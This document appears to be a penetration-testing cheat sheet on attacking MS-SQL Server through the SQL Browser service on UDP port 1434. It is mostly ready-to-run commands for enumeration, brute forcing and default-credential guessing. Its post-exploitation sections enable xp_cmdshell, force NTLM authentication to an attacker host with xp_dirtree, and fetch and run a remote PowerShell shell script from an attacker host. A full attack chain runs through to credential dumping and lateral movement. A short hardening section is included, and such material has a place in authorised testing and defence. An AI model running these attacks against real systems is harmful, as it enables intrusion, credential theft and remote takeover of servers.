# MS-SQL MONITOR ENUMERATION (Port 1434/UDP)

## SERVICE OVERVIEW
```
MS-SQL Server Browser Service (SQL Monitor)
- Port: 1434/UDP
- Enumerates SQL Server instances on a host
- Provides instance names, versions, ports
- Sends information in cleartext
- Critical for SQL Server enumeration
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sU -p1434 <IP>                            # UDP scan
nmap -sU -p1434 --script ms-sql-info <IP>       # SQL Server info
nmap -sU -p1434 --script broadcast-ms-sql-discover  # Discover all SQL servers
```

## NMAP ENUMERATION
```bash
# MS-SQL Browser enumeration
nmap -sU -p1434 --script ms-sql-info <IP>       # Instance info
nmap -sU -p1434 --script ms-sql-config <IP>     # Configuration
nmap -sU -p1434 --script ms-sql-empty-password <IP>  # Empty password check

# Comprehensive MS-SQL scan
nmap -sU -sV -p1434 --script "ms-sql-*" <IP> -oA mssql_scan

# Broadcast discovery (find all SQL servers on network)
nmap --script broadcast-ms-sql-discover
```

## MS-SQL BROWSER QUERY
```bash
# Manual UDP query to SQL Browser
echo -e "\x02" | nc -u <IP> 1434                # Discovery packet

# Response contains:
# - ServerName
# - InstanceName
# - IsClustered
# - Version
# - TCP port (often not 1433!)

# Python script for parsing response
cat > mssql_browser.py <<'EOF'
#!/usr/bin/env python3
import socket

def query_browser(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    sock.sendto(b'\x02', (ip, 1434))

    try:
        data, addr = sock.recvfrom(4096)
        print(data.decode('utf-8', errors='ignore'))
    except socket.timeout:
        print("No response (timeout)")
    finally:
        sock.close()

if __name__ == "__main__":
    import sys
    query_browser(sys.argv[1])
EOF

python3 mssql_browser.py <IP>
```

## ENUMERATE SQL SERVER INSTANCES
```bash
# Using nmap
nmap -sU -p1434 --script ms-sql-info <IP>

# Example output:
# ServerName: SQLSERVER01
# InstanceName: MSSQLSERVER (default instance)
# InstanceName: SQLEXPRESS (named instance)
# Version: 14.0.1000.169 (SQL Server 2017)
# tcp: 1433 (default instance port)
# tcp: 49152 (named instance port)

# Metasploit
msfconsole
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS <IP>
run
```

## METASPLOIT ENUMERATION
```bash
msfconsole

# MS-SQL Browser ping
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS <IP>
run

# MS-SQL login scanner (after finding port)
use auxiliary/scanner/mssql/mssql_login
set RHOSTS <IP>
set RPORT 1433                                  # Or discovered port
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# MS-SQL info gathering
use auxiliary/admin/mssql/mssql_enum
set RHOSTS <IP>
set RPORT 1433
set USERNAME sa
set PASSWORD <password>
run
```

## CONNECT TO DISCOVERED INSTANCES
```bash
# After discovering instance ports via 1434/UDP:

# Impacket mssqlclient
impacket-mssqlclient <user>@<IP> -port <discovered_port>
impacket-mssqlclient sa@<IP>                    # Default instance (1433)
impacket-mssqlclient sa@<IP> -port 49152        # Named instance

# Windows authentication
impacket-mssqlclient DOMAIN/user:password@<IP>
impacket-mssqlclient -windows-auth DOMAIN/user:password@<IP>

# sqsh (Linux SQL client)
sqsh -S <IP>:<port> -U sa -P <password>
```

## BRUTE FORCE ATTACKS
```bash
# After discovering SQL instance ports:

# Hydra
hydra -l sa -P passwords.txt mssql://<IP>:<port>
hydra -L users.txt -P passwords.txt mssql://<IP>:1433

# Medusa
medusa -h <IP>:<port> -u sa -P passwords.txt -M mssql

# CrackMapExec
crackmapexec mssql <IP> -u sa -p passwords.txt
crackmapexec mssql <IP> -u users.txt -p 'Password123!'

# Metasploit
use auxiliary/scanner/mssql/mssql_login
set RHOSTS <IP>
set RPORT <discovered_port>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## DEFAULT CREDENTIALS
```bash
# Common MS-SQL default credentials:
sa:<blank>                                      # Empty password
sa:sa
sa:password
sa:Password1
sa:P@ssw0rd
sa:Admin123
SQLEXPRESS:<blank>

# Test defaults
crackmapexec mssql <IP> -u sa -p ''
crackmapexec mssql <IP> -u sa -p 'sa'
crackmapexec mssql <IP> -u sa -p 'password'
```

## ENUMERATE NAMED INSTANCES
```bash
# SQL Browser returns named instances
# Example response:
# ServerName;SQLSERVER01;InstanceName;SQLEXPRESS;IsClustered;No;Version;14.0.1000.169;tcp;49152;;

# Extract instance info
nmap -sU -p1434 --script ms-sql-info <IP> | grep -E "InstanceName|tcp|Version"

# Connect to named instance
impacket-mssqlclient sa@<IP> -port 49152        # Use discovered TCP port
```

## VULNERABILITY SCANNING
```bash
# Check for vulnerabilities
nmap -sU -p1434 --script ms-sql-ntlm-info <IP>  # Get Windows/SQL info via NTLM

# Known vulnerabilities:
# CVE-2002-0649: SQL Slammer worm (port 1434 UDP)
# CVE-2008-5416: MS-SQL Server privilege escalation
# MS08-040: SQL Server vulnerabilities

# Metasploit vuln scanner
use auxiliary/scanner/mssql/mssql_hashdump      # Dump password hashes (if admin)
use auxiliary/scanner/mssql/mssql_schemadump    # Schema enumeration
```

## SQL SLAMMER WORM (HISTORICAL)
```bash
# CVE-2002-0649: SQL Slammer (Sapphire) worm
# Exploited buffer overflow in SQL Server 2000 via port 1434/UDP
# Still seen in legacy environments

# Check if vulnerable (old SQL Server 2000)
nmap -sU -p1434 --script ms-sql-info <IP> | grep -i "version"
# If "8.0" (SQL Server 2000), potentially vulnerable

# Note: Exploitation is for research/authorized testing only
```

## COMMON MISCONFIGURATIONS
```
☐ SQL Browser service enabled unnecessarily
☐ Default 'sa' account with blank/weak password
☐ SQL Server exposed to internet (port 1434/UDP + 1433/TCP)
☐ Named instances running on high ports (harder to firewall)
☐ No firewall rules restricting UDP 1434 access
☐ SQL Server 2000/2005 (outdated, vulnerable versions)
☐ Windows authentication disabled (SQL auth only)
☐ xp_cmdshell enabled (command execution)
☐ Verbose error messages revealing version/config
```

## QUICK WIN CHECKLIST
```
☐ Scan UDP port 1434 (MS-SQL Browser)
☐ Enumerate SQL Server instances and ports
☐ Test default credentials (sa with blank/weak passwords)
☐ Brute force 'sa' account if needed
☐ Connect to discovered instances
☐ Check SQL Server version for known vulnerabilities
☐ Test for xp_cmdshell if admin access gained
☐ Enumerate databases and tables
☐ Dump password hashes (sysadmin role)
☐ Attempt to enable xp_cmdshell for RCE
```

## ONE-LINER ENUMERATION
```bash
# Quick MS-SQL enumeration
nmap -sU -p1434 --script ms-sql-info <IP> && nmap -sV -p1433 --script ms-sql-empty-password <IP>

# Discover all SQL servers on network
nmap --script broadcast-ms-sql-discover
```

## POST-EXPLOITATION (AFTER SQL ACCESS)
```bash
# After gaining SQL access:

# Check current user and role
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');            # Check if sysadmin

# Enumerate databases
SELECT name FROM sys.databases;

# Enumerate tables
SELECT * FROM INFORMATION_SCHEMA.TABLES;

# Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

# Execute OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'ipconfig';
EXEC xp_cmdshell 'net user';

# Get NTLM hash (responder attack)
EXEC xp_dirtree '\\<attacker_IP>\share';        # Forces NTLM auth to attacker
# Run Responder on attacker to capture hash
```

## IMPACKET MSSQLCLIENT COMMANDS
```bash
# After connection
impacket-mssqlclient sa@<IP>
SQL> SELECT @@VERSION;                          # SQL Server version
SQL> SELECT name FROM sys.databases;            # List databases
SQL> USE <database>;                            # Switch database
SQL> SELECT * FROM <table>;                     # Query table

# Enable xp_cmdshell
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Execute commands
SQL> EXEC xp_cmdshell 'whoami';
SQL> xp_cmdshell 'powershell -c IEX(New-Object Net.WebClient).DownloadString(\"http://<attacker>/shell.ps1\")'
```

## SECURITY IMPLICATIONS
```
RISKS:
- Information disclosure (instance names, versions, ports)
- Credential brute forcing (sa account)
- SQL injection if application uses discovered instances
- Remote code execution via xp_cmdshell
- Password hash dumping (sysadmin access)
- Lateral movement via linked servers
- Data exfiltration

RECOMMENDATIONS:
- Disable SQL Browser service if not needed
- Use strong passwords for 'sa' and all SQL accounts
- Disable 'sa' account (use Windows authentication)
- Firewall port 1434/UDP to trusted networks only
- Keep SQL Server patched (latest version)
- Disable xp_cmdshell unless absolutely required
- Implement least privilege for SQL logins
- Enable SQL Server audit logging
- Monitor for brute force attempts
- Use Network Level Authentication (NLA)
```

## TOOLS
```bash
# Nmap
nmap -sU -p1434 --script ms-sql-* <IP>

# Impacket
impacket-mssqlclient sa@<IP>

# Metasploit
use auxiliary/scanner/mssql/mssql_ping
use auxiliary/scanner/mssql/mssql_login

# CrackMapExec
crackmapexec mssql <IP> -u sa -p 'password'

# Hydra
hydra -l sa -P passwords.txt mssql://<IP>

# sqsh (Linux SQL client)
sqsh -S <IP> -U sa -P password
```

## INTEGRATION WITH OTHER ATTACKS
```bash
# Attack chain:

# 1. Discover SQL instances
nmap -sU -p1434 --script ms-sql-info <IP>

# 2. Brute force discovered instances
crackmapexec mssql <IP> -u sa -p passwords.txt

# 3. Connect with valid credentials
impacket-mssqlclient sa:Password123@<IP>

# 4. Enable xp_cmdshell
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# 5. Execute commands / Get shell
SQL> xp_cmdshell 'whoami';
SQL> xp_cmdshell 'powershell -enc <base64_reverse_shell>';

# 6. Privilege escalation (if not SYSTEM)
# 7. Dump credentials (mimikatz, SAM, LSA)
# 8. Lateral movement
```
